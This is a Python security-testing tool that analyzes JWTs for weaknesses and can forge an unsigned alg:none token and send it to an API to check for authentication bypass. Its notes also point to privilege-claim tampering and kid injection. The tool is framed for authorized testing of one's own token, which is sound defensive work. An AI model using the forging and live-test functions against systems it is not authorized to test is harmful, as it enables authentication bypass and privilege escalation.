#!/usr/bin/env python3
"""
jwt_analyze.py

apk-drill — JWT / token weakness analyzer.

Decodes a JWT (your own test-account token), flags structural weaknesses, and
can actively test whether the API accepts a forged `alg:none` token — the
classic auth bypass. Static analysis is offline and safe; the active test needs
--live and a target you are authorized to test.

The token is read from an env var or stdin, never a CLI arg (stays out of shell
history). Its signature is never printed.

Usage:
  export JWT=eyJ...            # your test token
  jwt_analyze.py --token-env JWT                       # static analysis only
  jwt_analyze.py --token-env JWT --url https://api.x/me --header Authorization --live
"""
from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request


def _b64url_decode(seg: str) -> bytes:
    seg += "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def decode(token: str) -> tuple[dict, dict]:
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need at least header.payload)")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload


PRIV_CLAIMS = ("role", "roles", "is_admin", "admin", "isadmin", "scope", "scopes",
               "permissions", "groups", "authorities", "tier", "plan")


def analyze(header: dict, payload: dict, now: int | None = None) -> list[dict]:
    now = now or int(time.time())
    findings = []
    alg = str(header.get("alg", "")).lower()

    if alg == "none":
        findings.append({"sev": "critical", "check": "alg-none",
                         "note": "header alg=none — token is unsigned as-is"})
    if alg.startswith("hs"):
        findings.append({"sev": "info", "check": "symmetric-alg",
                         "note": f"alg={header.get('alg')} (HMAC). If the server also verifies RS256 "
                                 "tokens, it may be vulnerable to RS256->HS256 key confusion."})
    if "kid" in header:
        findings.append({"sev": "info", "check": "kid-present",
                         "note": "kid header present — test for kid path traversal / SQLi / injection."})

    exp = payload.get("exp")
    if exp is None:
        findings.append({"sev": "medium", "check": "no-exp",
                         "note": "no exp claim — token may never expire."})
    else:
        ttl = int(exp) - now
        if ttl <= 0:
            findings.append({"sev": "info", "check": "expired",
                             "note": f"token already expired ({-ttl}s ago) — test if server still accepts it."})
        elif ttl > 60 * 60 * 24 * 30:
            findings.append({"sev": "low", "check": "long-lived",
                             "note": f"very long TTL (~{ttl // 86400}d) — wide window if leaked."})

    present = [c for c in PRIV_CLAIMS if c in {k.lower() for k in payload}]
    if present:
        findings.append({"sev": "info", "check": "privilege-claims",
                         "note": f"privilege claims present ({', '.join(present)}); if signature is "
                                 "forgeable/none-accepted, test privilege escalation by tampering them."})
    return findings


def forge_none(token: str) -> str:
    """Return an unsigned alg:none variant carrying the same payload."""
    _, payload = decode(token)
    header = {"alg": "none", "typ": "JWT"}
    return _b64url_encode(json.dumps(header, separators=(",", ":")).encode()) + "." + \
        _b64url_encode(json.dumps(payload, separators=(",", ":")).encode()) + "."


def test_none_acceptance(url: str, header_name: str, prefix: str, forged: str, timeout: int = 12) -> dict:
    req = urllib.request.Request(url, headers={header_name: prefix + forged, "User-Agent": "apk-drill-jwt/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            status, body = r.status, r.read(200)
    except urllib.error.HTTPError as e:
        status, body = e.code, b""
    accepted = status is not None and 200 <= status < 300
    return {"url": url, "status": status, "none_accepted": accepted,
            "verdict": "VULNERABLE: alg:none accepted" if accepted else "rejected (good)"}


def self_test() -> int:
    # HS256, expired, admin role
    h = {"alg": "HS256", "typ": "JWT"}
    p = {"sub": "1", "role": "admin", "exp": 1000000000}  # long past
    tok = _b64url_encode(json.dumps(h).encode()) + "." + _b64url_encode(json.dumps(p).encode()) + ".sig"
    hh, pp = decode(tok)
    checks = {f["check"] for f in analyze(hh, pp, now=2000000000)}
    assert {"symmetric-alg", "expired", "privilege-claims"} <= checks, checks
    # alg none detection
    nonetok = forge_none(tok)
    nh, _ = decode(nonetok)
    assert nh["alg"] == "none" and nonetok.endswith(".")
    assert any(f["check"] == "alg-none" for f in analyze(nh, pp, now=999))
    # no-exp
    assert any(f["check"] == "no-exp" for f in analyze({"alg": "RS256"}, {"sub": "x"}))
    print("self-test OK")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="apk-drill JWT weakness analyzer")
    ap.add_argument("--token-env", help="env var holding the JWT (else read stdin)")
    ap.add_argument("--url", help="endpoint to test alg:none acceptance against")
    ap.add_argument("--header", default="Authorization", help="auth header name (default Authorization)")
    ap.add_argument("--prefix", default="Bearer ", help="value prefix (default 'Bearer ')")
    ap.add_argument("--live", action="store_true", help="perform the active alg:none test")
    ap.add_argument("--self-test", action="store_true")
    args = ap.parse_args()
    if args.self_test:
        return self_test()

    import os
    token = os.environ.get(args.token_env) if args.token_env else sys.stdin.read().strip()
    if not token:
        ap.error("no token (set --token-env or pipe it on stdin)")

    header, payload = decode(token)
    print("=== header ===")
    print(json.dumps(header, indent=2))
    print("=== payload (claims) ===")
    print(json.dumps(payload, indent=2))
    print("=== findings ===")
    for f in analyze(header, payload):
        print(f"  [{f['sev'].upper()}] {f['check']}: {f['note']}")

    if args.url:
        forged = forge_none(token)
        if not args.live:
            print(f"\n(dry-run) would send forged alg:none token to {args.url} "
                  f"via header {args.header!r}; re-run with --live.")
        else:
            print("\n=== active alg:none test ===")
            print("  " + test_none_acceptance(args.url, args.header, args.prefix, forged)["verdict"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
